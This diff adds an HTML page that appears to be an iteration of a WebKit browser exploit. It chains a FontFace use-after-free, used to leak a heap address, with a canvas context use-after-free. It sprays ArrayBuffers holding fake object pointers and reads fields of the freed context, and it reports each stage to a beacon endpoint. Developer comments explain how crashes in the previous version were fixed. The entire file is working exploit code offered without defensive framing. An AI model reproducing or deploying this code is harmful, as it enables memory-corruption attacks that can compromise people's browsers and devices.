@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P817</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+.ok{color:#3fb950;} .fail{color:#f85149;} .info{color:#58a6ff;} .hot{color:#ffa657;}
+</style>
+</head><body>
+<pre id="o">P817: zeroed CanvasStyle + m_canvas=H fix</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+
+function syncBn(t,d){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon.php?tag=P817-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+
+/* ========== PHASE 1: FontFace UAF → H ========== */
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs=[],ffired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffired)return undefined;
+    ffired=true;
+    if(st){st.remove();st.textContent='';st=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    fabs=[];
+    for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bb1');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  var bestI=-1,bestNz=0;
+  for(var i=0;i<fabs.length;i++){
+    var u=new Uint8Array(fabs[i]),nz=0;
+    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+    if(nz>bestNz){bestNz=nz;bestI=i;}
+  }
+  if(bestI<0||bestNz<4){
+    syncBn('FONT-MISS','nz='+bestNz);
+    log('FontFace miss','fail');
+    setTimeout(function(){location.reload();},200);
+    return;
+  }
+
+  var fontAB=fabs[bestI];
+  var fontDV=new DataView(fontAB);
+  var q11lo=fontDV.getUint32(0x58,true);
+  var q11hi=fontDV.getUint32(0x5C,true);
+  if(q11hi===0){
+    syncBn('FONT-BAD','q11hi=0');
+    setTimeout(function(){location.reload();},200);
+    return;
+  }
+  var borrow=(q11lo<0x68)?1:0;
+  var H_hi=q11hi-borrow, H_lo=(q11lo-0x68)>>>0;
+  var Hstr='0x'+H_hi.toString(16)+('00000000'+H_lo.toString(16)).slice(-8);
+
+  syncBn('FONT-OK','H='+Hstr);
+  log('H = '+Hstr,'ok');
+
+  /* ========== Configure H (fontAB) as fake State ========== */
+  /* CRITICAL FIX: all-zero CanvasStyle to avoid extended-color flag crash.
+   * P816v2 crashed because marker bytes 0xAA... at +20 likely set the
+   * "use ExtendedColor pointer" bit in WebKit's Color encoding. */
+  var fontU8=new Uint8Array(fontAB);
+  for(var i=0;i<192;i++)fontU8[i]=0;
+
+  /* State+0: globalAlpha = 1.0 (safe default) */
+  fontDV.setFloat64(0, 1.0, true);
+
+  /* State+16..+31: fillStyle = ALL ZEROS (transparent/default Color, no extended flag) */
+  /* State+32..+47: strokeStyle = ALL ZEROS */
+
+  /* State+48: lineWidth = 1.0 (default — avoid markers that might be misinterpreted) */
+  fontDV.setFloat64(48, 1.0, true);
+
+  /* State+64: miterLimit = 10.0 (WebKit default) */
+  fontDV.setFloat64(64, 10.0, true);
+
+  /* ========== PHASE 2: Canvas UAF ========== */
+  var innerCtx=null;
+  var canvas=document.createElement('canvas');
+  canvas.width=1;canvas.height=1;
+  var opts={};
+  Object.defineProperty(opts,'alpha',{
+    get:function(){
+      innerCtx=canvas.getContext('2d');
+      return true;
+    }
+  });
+  canvas.getContext('bitmaprenderer',opts);
+
+  if(!innerCtx){
+    syncBn('UAF-FAIL','');
+    setTimeout(function(){location.reload();},200);
+    return;
+  }
+  syncBn('UAF-OK','');
+  log('Canvas UAF OK','ok');
+
+  /* ========== PHASE 3: AB(768) spray ========== */
+  /* FIX 2: set m_canvas (+32) to H instead of 0.
+   * m_canvas is Ref<HTMLCanvasElement> — non-nullable.
+   * Compiler may skip null check and dereference unconditionally.
+   * H is a valid readable address, so initial deref won't SIGSEGV.
+   * Configure H+0..+31 as self-referencing chain for document() path. */
+  var SPRAY=500;
+  var abs768=[];
+  for(var s=0;s<SPRAY;s++){
+    var ab=new ArrayBuffer(768);
+    var dv=new DataView(ab);
+
+    /* m_canvas at +32 → H (valid readable address) */
+    dv.setUint32(32, H_lo, true);
+    dv.setUint32(36, H_hi, true);
+
+    /* m_stateStack at +112 → buffer=H, cap=1, size=1 */
+    dv.setUint32(112, H_lo, true);
+    dv.setUint32(116, H_hi, true);
+    dv.setUint32(120, 1, true);
+    dv.setUint32(124, 1, true);
+
+    abs768.push(ab);
+  }
+
+  /* Now configure H as a self-referencing object for the document() chain.
+   * H+0: self-reference (if vtable pointer, reads back H which is data not code)
+   * H+8: self-reference (if m_treeScope or other ptr field)
+   * H+16: self-reference (catch-all for any offset)
+   * This way, any chain of pointer dereferences through H keeps landing on H. */
+  fontDV.setUint32(0, H_lo, true);   /* H+0 lo → H (self-ref) */
+  fontDV.setUint32(4, H_hi, true);   /* H+0 hi */
+  /* BUT WAIT: H+0 was globalAlpha=1.0. We need BOTH:
+   * - globalAlpha=1.0 for the State view (read via m_stateStack[0])
+   * - Self-ref for the canvas-element view (read via m_canvas)
+   *
+   * These conflict! m_stateStack and m_canvas both point to H.
+   * The State starts at m_buffer[0] = H+0. globalAlpha is State+0 = H+0.
+   * The HTMLCanvasElement* is also at H.
+   *
+   * We can't have globalAlpha=1.0 AND self-ref at H+0 simultaneously.
+   *
+   * Solution: accept globalAlpha won't be 1.0.
+   * The self-reference pointer is more important for survival.
+   * globalAlpha will be whatever H_lo/H_hi looks like as float64.
+   * DAZ will zero it (heap pointer is a denormal).
+   * globalAlpha=0 just means everything is transparent — won't crash. */
+
+  /* Write self-references at H+0, +8, +16, +24 for robust pointer chain */
+  /* Each 8-byte slot = H address (self-ref) */
+  for(var r=0;r<192;r+=8){
+    fontDV.setUint32(r, H_lo, true);
+    fontDV.setUint32(r+4, H_hi, true);
+  }
+
+  /* The ENTIRE fontAB is now filled with H pointers (self-referencing).
+   * Any pointer dereference at any offset within H lands back on H.
+   * fillStyle at State+16 will be H_lo/H_hi bytes, strokeStyle at +32 the same.
+   * lineWidth at +48 = float64 interpretation of H = denormal = DAZ'd to 0.
+   *
+   * For the CanvasStyle (16 bytes at +16..+31):
+   *   bytes 0-7 = H_lo,H_hi (first qword)
+   *   bytes 8-15 = H_lo,H_hi (second qword)
+   * The Color "type" field might now be non-zero if H_lo's low bytes != 0.
+   * But at least no extended-color flag since H is a heap address, not a flag pattern. */
+
+  syncBn('SPRAY-DONE','n='+SPRAY+'|mcanvas=H');
+  log('Spray done: m_canvas=H, state=all-H-selfref','ok');
+
+  syncBn('READ-PRE','about_to_read');
+
+  var fsV='CRASH', ssV='CRASH', gaV='CRASH', lwV='CRASH', mlV='CRASH';
+  var fsOk=false, ssOk=false, gaOk=false, lwOk=false, mlOk=false;
+
+  try{ fsV=innerCtx.fillStyle; fsOk=true; }catch(e){ fsV='ERR:'+e.message; }
+  syncBn('AFTER-FS','ok='+fsOk+'|v='+fsV);
+
+  try{ ssV=innerCtx.strokeStyle; ssOk=true; }catch(e){ ssV='ERR:'+e.message; }
+  syncBn('AFTER-SS','ok='+ssOk+'|v='+ssV);
+
+  try{ gaV=innerCtx.globalAlpha; gaOk=true; }catch(e){ gaV='ERR:'+e.message; }
+  syncBn('AFTER-GA','ok='+gaOk+'|v='+gaV);
+
+  try{ lwV=innerCtx.lineWidth; lwOk=true; }catch(e){ lwV='ERR:'+e.message; }
+  syncBn('AFTER-LW','ok='+lwOk+'|v='+lwV);
+
+  try{ mlV=innerCtx.miterLimit; mlOk=true; }catch(e){ mlV='ERR:'+e.message; }
+  syncBn('AFTER-ML','ok='+mlOk+'|v='+mlV);
+
+  var passed=[];
+  if(fsOk) passed.push('FS='+fsV);
+  if(ssOk) passed.push('SS='+ssV);
+  if(gaOk) passed.push('GA='+gaV);
+  if(lwOk) passed.push('LW='+lwV);
+  if(mlOk) passed.push('ML='+mlV);
+
+  syncBn('RESULT','p='+passed.length+'/5|'+passed.join('|'));
+  syncBn('DONE','ok');
+
+  log('','');
+  log('=== RESULTS ===','hot');
+  log('fillStyle:   '+(fsOk?'OK':'FAIL')+' = '+fsV, fsOk?'ok':'fail');
+  log('strokeStyle: '+(ssOk?'OK':'FAIL')+' = '+ssV, ssOk?'ok':'fail');
+  log('globalAlpha: '+(gaOk?'OK':'FAIL')+' = '+gaV, gaOk?'ok':'fail');
+  log('lineWidth:   '+(lwOk?'OK':'FAIL')+' = '+lwV, lwOk?'ok':'fail');
+  log('miterLimit:  '+(mlOk?'OK':'FAIL')+' = '+mlV, mlOk?'ok':'fail');
+  log('Passed: '+passed.length+'/5','hot');
+
+  if(passed.length>0){
+    log('','');
+    log('*** AB RECLAIM READ SURVIVED! ***','hot');
+  }
+
+  for(var c=0;c<abs768.length;c++){
+    var u8=new Uint8Array(abs768[c]);
+    for(var z=0;z<768;z++)u8[z]=0;
+  }
+
+},600);
+</script></body></html>
